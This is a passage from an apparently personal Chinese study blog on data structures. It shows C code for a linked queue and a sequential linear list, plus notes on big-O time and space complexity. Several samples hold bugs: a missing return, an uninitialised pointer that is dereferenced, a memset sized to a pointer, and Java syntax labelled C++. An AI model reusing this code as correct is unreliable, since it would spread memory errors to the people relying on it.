((*linkQueue) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    (*linkQueue)-&gt;front = <span class="hljs-literal">NULL</span>;<br>    (*linkQueue)-&gt;rear = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">GetHead</span><span class="hljs-params">(LinkQNode *linkQNode, ElemType *e)</span> &#123;<br>    *e = (*linkQNode)-&gt;front-&gt;next-&gt;data;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">EnQueue</span><span class="hljs-params">(LinkQNode *linkQNode, ElemType e)</span> &#123;<br>    QNode *qNode = (QNode *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(QNode));<br>    <span class="hljs-keyword">if</span> (qNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    qNode-&gt;data = e;<br>    qNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> ((*linkQNode)-&gt;front == (*linkQNode)-&gt;rear) &#123;<br>        (*linkQNode)-&gt;front-&gt;next = qNode;<br>    &#125;<br>    (*linkQNode)-&gt;rear-&gt;next = qNode;<br>    (*linkQNode)-&gt;rear = qNode;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">DeQueue</span><span class="hljs-params">(LinkQNode *linkQNode, ElemType *e)</span> &#123;<br>    <span class="hljs-keyword">if</span> ((*linkQNode) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    QNode *qNode;<br>    *e = (*linkQNode)-&gt;front-&gt;next-&gt;data;<br>    qNode = (*linkQNode)-&gt;front-&gt;next;<br>    (*linkQNode)-&gt;front-&gt;next = (*linkQNode)-&gt;front-&gt;next-&gt;next;<br>    <span class="hljs-built_in">free</span>(qNode);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    LinkQNode linkQNode;<br>    ElemType e;<br>    CreatLinkQueue(&amp;linkQNode);<br>    InitNode(&amp;linkQNode);<br>    EnQueue(&amp;linkQNode, <span class="hljs-number">1</span>);<br>    EnQueue(&amp;linkQNode, <span class="hljs-number">244</span>);<br>    GetHead(&amp;linkQNode, &amp;e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, e);<br>    DeQueue(&amp;linkQNode, &amp;e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, e);<br>    GetHead(&amp;linkQNode, &amp;e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, e);<br>    DestroyNode(&amp;linkQNode);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构和算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>线性表</title>
    <link href="/2023/03/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%BA%BF%E6%80%A7%E8%A1%A8/"/>
    <url>/2023/03/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%BA%BF%E6%80%A7%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h3 id="时间和空间复杂度"><a href="#时间和空间复杂度" class="headerlink" title="时间和空间复杂度"></a>时间和空间复杂度</h3><p><img src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20230322151152567.png" alt="image-20230322151152567"></p><p><img src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20230322151451180.png" alt="image-20230322151451180"></p><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><ol><li><p>使用big O计数法</p></li><li><p>实例</p><ul><li><p>O(1)  常量级的算法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> b=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> c=<span class="hljs-number">0</span>;<br>a=b;<br>a=c;<br>b=c;<br><span class="hljs-comment">//就算重复1000000+都是一个常量</span><br></code></pre></td></tr></table></figure></li><li><p>O(n)   </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;++i)&#123;<br>    <span class="hljs-comment">//代码</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>O(logN) </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">while</span>(i&lt;n)&#123;<br>    i*=<span class="hljs-number">2</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><img src="C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322182248288.png" alt="image-20230322182248288" style="zoom:50%;" /></li><li><p>O(NM)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;m;++j)&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ol><h4 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><ol><li><p>实例</p><ul><li><p>O(1)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> b=<span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure></li><li><p>O(n)  new 一个维数组</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span>[] newArray = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[n];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;++i)&#123;<br>    newArray[i]=i;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>O(n*n)  new 二个维数组</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> [][] newArray = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[n][n];<br></code></pre></td></tr></table></figure></li></ul></li></ol><h3 id="线性表（案例分析）"><a href="#线性表（案例分析）" class="headerlink" title="线性表（案例分析）"></a>线性表（案例分析）</h3><ol><li><p>线性表具有同一种特性的数据元素的一个有限的序列</p><p>![image-20230322183519529](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322183519529.png)</p></li><li><p>注意</p><ul><li>下标由1开始</li></ul></li><li><p>基本代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX =<span class="hljs-number">100</span>;<br><span class="hljs-comment">//顺序结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">List</span>&#123;<br>    ELETMENT List[MAX];<br>    <span class="hljs-type">int</span> listLenth;<br>&#125;List;<br></code></pre></td></tr></table></figure><p><img src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20230322155844508.png" alt="image-20230322155844508"></p><p><img src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20230322155956690.png" alt="image-20230322155956690"></p></li><li><p>缺点</p><ul><li>存储空间分配不灵活</li><li>空间复杂度高</li></ul></li></ol><h3 id="线性表的类型定义"><a href="#线性表的类型定义" class="headerlink" title="线性表的类型定义"></a>线性表的类型定义</h3><ol><li>线性表的操作<ul><li><p>线性表的初始化（<code>IniList</code>）![image-20230322191953037](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322191953037.png)</p></li><li><p>线性表的销毁（<code>DestroyList</code>）</p><p>连本身都没有了</p><p>![image-20230322192004208](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322192004208.png)</p></li><li><p>线性表的清楚（<code>ClearList</code>）</p><p>还存在，但是是一个空表</p><p>![image-20230322192014702](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322192014702.png)</p></li><li><p>判断线性表是否为空（<code>ListEmpty</code>）</p><p>![image-20230322192029109](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322192029109.png)</p></li><li><p>求线性表的长度（<code>ListLength</code>）</p><p>![image-20230322192050448](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322192050448.png)</p></li><li><p>获取元素(<code>GetElem</code>)</p><p>![image-20230322190529314](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322190529314.png)</p></li><li><p>查找元素（<code>LocateElem</code>）</p><p>![image-20230322190615757](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322190615757.png)</p></li><li><p>求一个元素的前驱（<code>PrioElem</code>）</p><p>![image-20230322190742641](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322190742641.png)</p></li><li><p>获得一个元素的后继（<code>NextElem</code>）</p><p>![image-20230322190833997](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322190833997.png)</p></li><li><p>插入一个元素（<code>ListInsert</code>）</p><p>![image-20230322191334889](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322191334889.png)</p></li><li><p>删除一个元素（<code>ListDelete</code>）</p><p>![image-20230322191749620](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322191749620.png)</p></li><li><p>遍历线性表（<code>LIstTraverse</code>）</p><p>![image-20230322191844657](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322191844657.png)</p></li></ul></li></ol><h3 id="线性表的存储结构"><a href="#线性表的存储结构" class="headerlink" title="线性表的存储结构"></a>线性表的存储结构</h3><h4 id="顺序结构"><a href="#顺序结构" class="headerlink" title="顺序结构"></a>顺序结构</h4><ol><li><p>定义：把逻辑上相邻的数据元素存储在物理相邻的存储单元</p><p>![image-20230322192505711](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322192505711.png)</p></li></ol><h3 id="线性表的顺序表示和实现"><a href="#线性表的顺序表示和实现" class="headerlink" title="线性表的顺序表示和实现"></a>线性表的顺序表示和实现</h3><ol><li><p>实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-comment">//基本模板</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">#define  SIZE 100</span><br><span class="hljs-comment">typedef struct&#123;</span><br><span class="hljs-comment">    ElemType elem[SIZE];</span><br><span class="hljs-comment">    int length;</span><br><span class="hljs-comment">&#125;SqList;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">//int 型</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE 100</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">int</span> intElem[SIZE];<br>    <span class="hljs-type">int</span> length;<br>&#125;intList;<br><br><span class="hljs-comment">//int double</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">int</span> intElem;<br>    <span class="hljs-type">double</span> doubleElem;<br>&#125;Polynomial;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    Polynomial * PPolynomial;<br>    <span class="hljs-type">int</span> length;<br>&#125;PolynomialList;<br><br><br><span class="hljs-comment">//struct</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">char</span>* name;<br>    <span class="hljs-type">char</span>* author;<br>    <span class="hljs-type">float</span> price;<br>    <span class="hljs-type">int</span> num;<br>&#125;Book;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    Book* pBook;<br>    <span class="hljs-type">int</span> length;<br>&#125;BookList;<br><br><br></code></pre></td></tr></table></figure></li></ol><h3 id="类C语言相关操作"><a href="#类C语言相关操作" class="headerlink" title="类C语言相关操作"></a>类C语言相关操作</h3><ol><li><p><code>ElemType</code> 元素</p></li><li><p>C语言动态内存分配</p></li></ol><ul><li><p><code>malloc</code>: 开辟连续的地址空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">intList *pIntList=(intList*) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span> (intList)*SIZE);<br><span class="hljs-built_in">free</span>(pIntList);<br></code></pre></td></tr></table></figure></li></ul><h3 id="线性表的顺序存储"><a href="#线性表的顺序存储" class="headerlink" title="线性表的顺序存储"></a>线性表的顺序存储</h3><p>![image-20230323091558306](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230323091558306.png)</p><ol><li><p>代码示例</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;string.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR -1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType char</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE 100</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    ElemType *elem;<br>    <span class="hljs-type">int</span> length;<br>&#125; IntList;<br><br><span class="hljs-function">status <span class="hljs-title">initList_Sq</span><span class="hljs-params">(IntList *list)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">destroyList</span><span class="hljs-params">(IntList *list)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">clearList</span><span class="hljs-params">(IntList *list)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">getListLength</span><span class="hljs-params">(IntList *list)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">getElem</span><span class="hljs-params">(IntList *list, <span class="hljs-type">int</span> i, ElemType *e)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">isEmpty</span><span class="hljs-params">(IntList *list)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">locateElem</span><span class="hljs-params">(IntList *list, ElemType e)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">listInsert</span><span class="hljs-params">(IntList *list, <span class="hljs-type">int</span> s, ElemType e)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">listDelete</span><span class="hljs-params">(IntList *list, <span class="hljs-type">int</span> s, ElemType *e)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    ElemType *e;<br>    IntList *list = (IntList *) <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(IntList));<br>    <span class="hljs-comment">//初始化</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">initList_Sq</span>(list) != <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ERROR\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(ERROR);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        list-&gt;elem[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        list-&gt;length++;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; list-&gt;length; ++i) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, list-&gt;elem[i]);<br>    &#125;<br><br>    <span class="hljs-built_in">clearList</span>(list);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%s\n&quot;</span>, <span class="hljs-built_in">isEmpty</span>(list) ? <span class="hljs-string">&quot;true&quot;</span> : <span class="hljs-string">&quot;false&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        list-&gt;elem[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        list-&gt;length++;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d\n&quot;</span>, <span class="hljs-built_in">getListLength</span>(list));<br>    <span class="hljs-built_in">getElem</span>(list, <span class="hljs-number">4</span>, e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%c\n&quot;</span>, *e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, <span class="hljs-built_in">locateElem</span>(list, <span class="hljs-string">&#x27;d&#x27;</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, <span class="hljs-built_in">locateElem</span>(list, <span class="hljs-string">&#x27;D&#x27;</span>));<br>    <span class="hljs-built_in">listInsert</span>(list, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;5&#x27;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; list-&gt;length; ++i) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, list-&gt;elem[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-built_in">listDelete</span>(list,<span class="hljs-number">5</span>,e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c\n&quot;</span>,*e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,list-&gt;elem);<br><br>    <span class="hljs-built_in">listDelete</span>(list,<span class="hljs-number">26</span>,e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%c\n&quot;</span>,*e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,list-&gt;elem);<br><br>    <span class="hljs-built_in">destroyList</span>(list);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//删除</span><br><span class="hljs-function">status <span class="hljs-title">listDelete</span><span class="hljs-params">(IntList *list, <span class="hljs-type">int</span> s, ElemType *e)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (s &lt; <span class="hljs-number">1</span> || s &gt; list-&gt;length) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    *e=list-&gt;elem[s<span class="hljs-number">-1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = s - <span class="hljs-number">1</span>; i &lt; list-&gt;length - <span class="hljs-number">1</span>; ++i) &#123;<br>        list-&gt;elem[i] = list-&gt;elem[i + <span class="hljs-number">1</span>];<br>    &#125;<br>    list-&gt;elem[--list-&gt;length] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//插入</span><br><span class="hljs-function">status <span class="hljs-title">listInsert</span><span class="hljs-params">(IntList *list, <span class="hljs-type">int</span> s, ElemType e)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (s &gt; SIZE || s &lt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = list-&gt;length - <span class="hljs-number">1</span>; i &gt;= s - <span class="hljs-number">1</span>; --i) &#123;<br>        list-&gt;elem[i + <span class="hljs-number">1</span>] = list-&gt;elem[i];<br>    &#125;<br>    list-&gt;elem[s - <span class="hljs-number">1</span>] = e;<br>    list-&gt;length++;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//顺序查找空间复杂度为  O(n)</span><br><span class="hljs-function">status <span class="hljs-title">locateElem</span><span class="hljs-params">(IntList *list, ElemType e)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; list-&gt;length; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (e == list-&gt;elem[i]) &#123;<br>            <span class="hljs-keyword">return</span> i + <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function">status <span class="hljs-title">getElem</span><span class="hljs-params">(IntList *list, <span class="hljs-type">int</span> i, ElemType *e)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">0</span> || i &gt; list-&gt;length) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    *e = list-&gt;elem[i - <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function">status <span class="hljs-title">getListLength</span><span class="hljs-params">(IntList *list)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!list) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">return</span> list-&gt;length;<br>&#125;<br><br><span class="hljs-function">status <span class="hljs-title">isEmpty</span><span class="hljs-params">(IntList *list)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (list-&gt;length == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-function">status <span class="hljs-title">clearList</span><span class="hljs-params">(IntList *list)</span> </span>&#123;<br>    <span class="hljs-built_in">memset</span>(list-&gt;elem, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(list-&gt;elem));<br>    list-&gt;length = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function">status <span class="hljs-title">destroyList</span><span class="hljs-params">(IntList *list)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (list) <span class="hljs-built_in">free</span>(list);<br>    <span class="hljs-keyword">if</span> (!list) <span class="hljs-keyword">return</span> OK;<br>    <span class="hljs-keyword">return</span> ERROR;<br>&#125;<br><br><span class="hljs-function">status <span class="hljs-title">initList_Sq</span><span class="hljs-params">(IntList *list)</span> </span>&#123;<br>    list-&gt;elem = (ElemType *) 